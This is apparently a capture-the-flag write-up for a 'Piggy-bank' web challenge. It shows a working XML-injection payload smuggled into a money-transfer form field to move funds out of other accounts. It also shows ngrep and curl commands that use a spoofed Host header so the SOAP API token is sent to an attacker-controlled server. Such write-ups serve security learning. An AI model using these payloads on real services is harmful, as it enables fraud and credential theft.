# Piggy-bank 

## Challenge description 
Hack some bank for me.  
[bank](http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/) 

## Overview 
Application seems to be a simple banking app which one can register an account and sign-into his/her account to perform some transactions. Each user will receive `110$` per registration as bonus point. By looking closely in app, it seems it's under sort of development for new API. At `for_developers.php` page in comments, there's a link to wsdl api page. 

```html
<!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) -->
``` 

In order to interacting better with web service, I installed Wsdler extension on Burp suite which by using that you can simply query the API. We can see there're two functions exported on this endpoint, one for checking the balance of a specific account (`requestBalance`) and the other one for making a transaction between two bank account (`internalTransfer`). 

## Objective 
There's a [VIP page](http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/vip.php), which only has the following text: 

```
This section is available only to privileged pigs with money in pockets. Transfer to the piggy-bank 1 000 000 coins and become important. 
```

So, in order to retrieve flag, one needs to have 1,000,000 coins in his account. I guess now tasks is pretty straightforward. Rob money from other account and get flag in VIP page. 

## Vulnerability 
I found two vulnerability in this challenge which the first one is [XML Injection](https://www.owasp.org/index.php/Testing_for_XML_Injection_\(OTG-INPVAL-008\)) and the second one is a trick to leak web service API token. 

* [API token leak](#token-leakage)

---- 
### XML injection 
>> by taking a look at trasnfer.php page, customer can enter receiver's bank ID and amount of money to be transferred. The request would be like the following: 

```
POST /home/transfer.php HTTP/1.1
Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=6d3g0hckqb87h8e8q91qdsmnb7

receiver=2495&amount=100.00
``` 

>> As we noticed there's an API working with transferring money between account. Signature of that service andthe arguments needed to be passed to the service contains two more variables, sender and token, which we don't have access to [API token](#token-leakage). 

>> Service endpoint is located at `/api/bankservice.php` and the corresponding request for transferring money is: 

```xml
POST /api/bankservice.php HTTP/1.1
SOAPAction: urn:internalTransferAction
Content-Type: text/xml;charset=UTF-8
Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:Bank">
<soapenv:Header/>
    <soapenv:Body>
        <urn:internalTransfer soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <receiver_wallet_num xsi:type="xsd:decimal">2479</receiver_wallet_num>
            <sender_wallet_num xsi:type="xsd:decimal">2495</sender_wallet_num>
            <amount xsi:type="xsd:float">1000000.00</amount>
            <token xsi:type="xsd:string">???</token> <!-- we don't have token!! -->
        </urn:internalTransfer>
    </soapenv:Body>
</soapenv:Envelope>
``` 

>> POST request on transfer page communicating with this function on API side and populate its XML with data provided by user. So, if the application doesn't sanitize user's provided input, attacker can inject XML content to the POST data. Payload I used is: 


```xml
POST /home/transfer.php HTTP/1.1
Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=hn4gme6jp5inm5169rjullg7f3

receiver=1376</receiver_wallet_num><sender_wallet_num xsi:type="xsd:decimal">1339</sender_wallet_num><amount xsi:type="xsd:float">690067.00<!-- &amount=100 -->
``` 

>> In order to get a list of high balanced valuable accounts, you can brute force a little bit and I found a bunch of those. Now we got our first successful transaction and we should do it until our coins goes beyond 1,000,000. Finally we can get our shinny flag at VIP page: 

```
You are pig-Hacker! How you stole money?!?!! Flag: ctfzone{dcaa1f2047501ac0f4ae6f448082e63e} 
``` 


---- 
### Token leakage 
>> I got this idea from Ryo (@icchy), kudos to him. 
>> As it's obvious application should parse WSDL XML file to get endpoint address and other information regarding how to communicate with web service. In this way, if by chance one can modify host header of `transfer.php` to his own server, and respectively place the web service XML file which application is looking for that at `/var/www/html/api/bankservice.wsdl.php`; we can leak token which we previously didn't have during this communication which is somehow similar to be a MITM for web service. 

>> *1. On your server do: 
    >> `sudo ngrep -q -d ens4 -i '<token' -W byline port 80`
>> 2. Send a request to transfer.php with host: <your_server> 
    >> `curl -H 'host: your_server' http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/transfer.php -d 'receiver=1376&amount=100'`
>> then you should receive this packet: 

```xml
interface: ens4 (10.128.0.7/255.255.255.255)
filter: (ip or ip6) and ( port 80  )
match: <token

T 18.184.147.62:42468 -> 10.128.0.7:80 [AP]
POST /api/bankservice.php HTTP/1.1.
Host: 35.226.92.164.
Connection: Keep-Alive.
User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.
Content-Type: application/soap+xml; charset=utf-8; action="internalTransferAction".
Content-Length: 738.
.
<SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Bank" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <SOAP-ENV:Body>
        <ns1:internalTransfer>
                <receiver_wallet_num xsi:type="xsd:decimal">1376</receiver_wallet_num>
                <sender_wallet_num xsi:type="xsd:decimal">1376</sender_wallet_num>
                <amount xsi:type="xsd:float">100</amount>
                <token xsi:type="xsd:token">somesupertokenkey1235555</token>
        </ns1:internalTransfer>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
``` 

And here it is, API token leaked!: 

`<token xsi:type="xsd:token">somesupertokenkey1235555</token>` 



Sincerely,  
@pwnslinger :shell: :fish: [@Shellphish]  
